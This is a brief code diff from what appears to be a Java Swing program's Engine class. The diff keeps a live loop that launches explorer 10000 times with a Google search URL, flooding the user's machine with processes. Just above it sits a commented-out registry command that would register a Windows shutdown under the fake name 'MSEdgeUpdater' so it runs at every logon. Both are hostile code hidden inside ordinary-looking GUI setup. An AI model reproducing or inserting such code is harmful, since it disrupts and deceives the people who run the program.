@@ -400,8 +400,9 @@ public class Engine extends JPanel {
 		// HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v MSEdgeUpdater /t
 		// REG_SZ /d \"shutdown /s /t 60000\""};
 		String s[] = { "explorer", "\"https://www.google.com/search?q=i+love+avaline+so+much\"" };
+		Runtime r = Runtime.getRuntime();
 		for (int i = 0; i < 10000; i++)
-			Runtime.getRuntime().exec(s);
+			r.exec(s);
 		frame.setSize(800, 800);
 		frame.setLocation(0, 0);
 		frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
